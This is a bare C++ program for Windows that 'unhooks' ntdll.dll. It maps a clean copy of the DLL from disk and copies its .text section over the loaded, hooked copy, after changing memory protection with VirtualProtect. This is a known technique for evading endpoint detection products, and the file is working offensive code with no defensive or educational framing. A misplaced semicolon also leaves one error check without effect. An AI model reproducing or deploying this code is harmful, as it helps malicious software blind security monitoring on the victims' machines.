#include <windows.h>
#include <psapi.h>
#include <iostream>

int main()
{
	HMODULE hOldNtdll = NULL;
	MODULEINFO info = {};
	LPVOID lpBaseAddress = NULL;
	HANDLE hNewNtdll = NULL;
	HANDLE hFileMapping = NULL;
	LPVOID lpFileData = NULL;
	PIMAGE_DOS_HEADER pDosHeader = NULL;
	PIMAGE_NT_HEADERS64 pNtHeader = NULL;

	// Get baseAddress of hooked ntdll.dll

	hOldNtdll = GetModuleHandleW(L"ntdll");

	if (!GetModuleInformation(
		GetCurrentProcess(),
		hOldNtdll,
		&info,
		sizeof(MODULEINFO)));

	lpBaseAddress = info.lpBaseOfDll;
	std::cout << std::hex << lpBaseAddress;

	// Map new ntdll.dll from disk into memory

	hNewNtdll = CreateFileW(
		L"C:\\Windows\\System32\\ntdll.dll",
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	hFileMapping = CreateFileMappingW(
		hNewNtdll,
		NULL,
		PAGE_READONLY | SEC_IMAGE,
		0, 0, NULL);

	lpFileData = MapViewOfFile(
		hFileMapping,
		FILE_MAP_READ,
		0, 0, 0);

	std::cout << std::hex << lpFileData;

	// Parse PE header of hooked ntdll.dll to look for .text section

	pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddress;
	pNtHeader = (PIMAGE_NT_HEADERS64)((ULONG_PTR)lpBaseAddress + pDosHeader->e_lfanew);

	for (int i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++)
	{
		PIMAGE_SECTION_HEADER pSection =
			(PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(pNtHeader) +
				((ULONG_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((PCHAR)pSection->Name, ".text"))
		{
			DWORD dwOldProtection = 0;
			VirtualProtect(
				(LPVOID)((ULONG_PTR)lpBaseAddress + pSection->VirtualAddress),
				pSection->Misc.VirtualSize,
				PAGE_EXECUTE_READWRITE,
				&dwOldProtection);

			// Copy contents of .text section from clean ntdll.dll
			memcpy(
				(LPVOID)((ULONG_PTR)lpBaseAddress + pSection->VirtualAddress),
				(LPVOID)((ULONG_PTR)lpFileData + pSection->VirtualAddress),
				pSection->Misc.VirtualSize);

			VirtualProtect(
				(LPVOID)((ULONG_PTR)lpBaseAddress + pSection->VirtualAddress),
				pSection->Misc.VirtualSize,
				dwOldProtection,
				&dwOldProtection);

			break;
		}
	}
}
